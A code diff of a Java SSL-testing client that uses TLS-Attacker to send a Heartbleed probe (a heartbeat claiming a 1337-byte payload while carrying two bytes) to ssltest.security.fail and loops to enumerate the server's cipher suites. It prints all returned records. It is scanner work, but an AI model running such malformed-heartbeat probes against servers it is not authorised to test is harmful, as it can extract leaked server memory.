@@ -2,6 +2,7 @@ package de.dogcraft.ssltest;
 
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.List;
 
 import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
@@ -15,17 +16,25 @@ import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandlerFactory;
 import de.rub.nds.tlsattacker.tls.config.GeneralConfig;
 import de.rub.nds.tlsattacker.tls.constants.CipherSuite;
+import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
+import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
 import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
 import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
 import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
 import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
+import de.rub.nds.tlsattacker.tls.protocol.handshake.CertificateMessage;
+import de.rub.nds.tlsattacker.tls.protocol.handshake.ServerHelloMessage;
+import de.rub.nds.tlsattacker.tls.protocol.handshake.ServerKeyExchangeMessage;
 import de.rub.nds.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
+import de.rub.nds.tlsattacker.tls.record.Record;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.transport.TransportHandler;
 
 public class TLSAttackerClient {
+
+    static boolean gotCipher = false;
 
     public static void main(String[] args) {
         ArrayList<CipherSuite> ciphers = new ArrayList<CipherSuite>(Arrays.asList(new CipherSuite[] {
@@ -362,67 +371,106 @@ public class TLSAttackerClient {
                 CipherSuite.TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256
         }));
 
-        GeneralConfig generalConfig = new GeneralConfig();
-        generalConfig.setQuiet(false);
-        generalConfig.setDebug(true);
+        do {
 
-        HeartbleedCommandConfig heartbleed = new HeartbleedCommandConfig();
-        heartbleed.setConnect("ssltest.security.fail:443");
-        heartbleed.setProtocolVersion(ProtocolVersion.TLS12);
-        heartbleed.setCipherSuites(ciphers);
+            GeneralConfig generalConfig = new GeneralConfig();
+            generalConfig.setQuiet(false);
+            generalConfig.setDebug(true);
 
-        Attacker<ClientCommandConfig> attacker = new Attacker<ClientCommandConfig>(heartbleed) {
+            HeartbleedCommandConfig heartbleed = new HeartbleedCommandConfig();
+            heartbleed.setConnect("ssltest.security.fail:443");
+            heartbleed.setProtocolVersion(ProtocolVersion.TLS12);
+            heartbleed.setCipherSuites(ciphers);
 
-            @Override
-            public void executeAttack(ConfigHandler configHandler) {
-                TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
-                TlsContext tlsContext = configHandler.initializeTlsContext(config);
+            Attacker<ClientCommandConfig> attacker = new Attacker<ClientCommandConfig>(heartbleed) {
 
-                WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+                @Override
+                public void executeAttack(ConfigHandler configHandler) {
+                    TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+                    TlsContext tlsContext = configHandler.initializeTlsContext(config);
 
-                WorkflowTrace trace = tlsContext.getWorkflowTrace();
+                    WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 
-                ModifiableByte heartbeatMessageType = new ModifiableByte();
-                ModifiableInteger payloadLength = new ModifiableInteger();
-                payloadLength.setModification(IntegerModificationFactory.explicitValue(1337));
-                ModifiableByteArray payload = new ModifiableByteArray();
-                payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
-                HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
-                hb.setHeartbeatMessageType(heartbeatMessageType);
-                hb.setPayload(payload);
-                hb.setPayloadLength(payloadLength);
+                    WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
-                try {
-                    workflowExecutor.executeWorkflow();
-                } catch (WorkflowExecutionException ex) {
-                    System.out.println("The TLS protocol flow was not executed completely, follow the debug messages for more information.");
-                    ex.printStackTrace(System.out);
-                }
+                    ModifiableByte heartbeatMessageType = new ModifiableByte();
+                    ModifiableInteger payloadLength = new ModifiableInteger();
+                    payloadLength.setModification(IntegerModificationFactory.explicitValue(1337));
+                    ModifiableByteArray payload = new ModifiableByteArray();
+                    payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
+                    HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstProtocolMessage(ProtocolMessageType.HEARTBEAT);
+                    hb.setHeartbeatMessageType(heartbeatMessageType);
+                    hb.setPayload(payload);
+                    hb.setPayloadLength(payloadLength);
 
-                if (trace.containsServerFinished()) {
-                    ProtocolMessage lastMessage = trace.getLastServerMesssage();
-                    if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
-                        System.out.println("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
-                        vulnerable = true;
-                    } else {
-                        System.out.println("(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
-                        vulnerable = false;
+                    try {
+                        workflowExecutor.executeWorkflow();
+                    } catch (WorkflowExecutionException ex) {
+                        System.out.println("The TLS protocol flow was not executed completely, follow the debug messages for more information.");
+                        ex.printStackTrace(System.out);
                     }
-                } else {
-                    System.out.println("Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
+
+                    List<ProtocolMessage> msg = trace.getProtocolMessages();
+                    for (ProtocolMessage pm : msg) {
+                        ConnectionEnd pmi = pm.getMessageIssuer();
+                        ProtocolMessageType pmt = pm.getProtocolMessageType();
+                        System.out.print(ConnectionEnd.CLIENT.equals(pmi) ? " -> C>S:" : " <- S>C:");
+                        System.out.print(pmt.toString());
+                        System.out.println(":");
+                        if (pm.getRecords() != null) {
+                            for (Record pmr : pm.getRecords()) {
+                                System.out.println(pmr.toString());
+                            }
+                        }
+                    }
+
+                    try {
+                        ProtocolMessage pm_server_hello = trace.getFirstHandshakeMessage(HandshakeMessageType.SERVER_HELLO);
+                        ProtocolMessage pm_server_keyexchange = trace.getFirstHandshakeMessage(HandshakeMessageType.SERVER_KEY_EXCHANGE);
+                        ProtocolMessage pm_server_certificate = trace.getFirstHandshakeMessage(HandshakeMessageType.CERTIFICATE);
+
+                        ServerHelloMessage server_hello = (ServerHelloMessage) pm_server_hello;
+                        ServerKeyExchangeMessage server_keyexchange = (ServerKeyExchangeMessage) pm_server_keyexchange;
+                        CertificateMessage server_certificate = (CertificateMessage) pm_server_certificate;
+
+                        CipherSuite server_cipher = CipherSuite.getCipherSuite(server_hello.getSelectedCipherSuite().getValue());
+
+                        System.out.println(server_cipher.toString());
+
+                        ciphers.remove(server_cipher);
+
+                        gotCipher = true;
+                    } catch (Exception e) {
+                        gotCipher = false;
+                    }
+
+                    if (trace.containsServerFinished()) {
+                        ProtocolMessage lastMessage = trace.getLastServerMesssage();
+                        if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
+                            System.out.println("Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
+                            vulnerable = true;
+                        } else {
+                            System.out.println("(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
+                            vulnerable = false;
+                        }
+                    } else {
+                        System.out.println("Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
+                    }
+
+                    tlsContexts.add(tlsContext);
+
+                    transportHandler.closeConnection();
                 }
 
-                tlsContexts.add(tlsContext);
+            };
 
-                transportHandler.closeConnection();
-            }
+            ConfigHandler configHandler = ConfigHandlerFactory.createConfigHandler(ClientCommandConfig.COMMAND);
+            configHandler.initialize(generalConfig);
 
-        };
+            attacker.executeAttack(configHandler);
 
-        ConfigHandler configHandler = ConfigHandlerFactory.createConfigHandler(ClientCommandConfig.COMMAND);
-        configHandler.initialize(generalConfig);
+        } while (gotCipher);
 
-        attacker.executeAttack(configHandler);
     }
 
 }
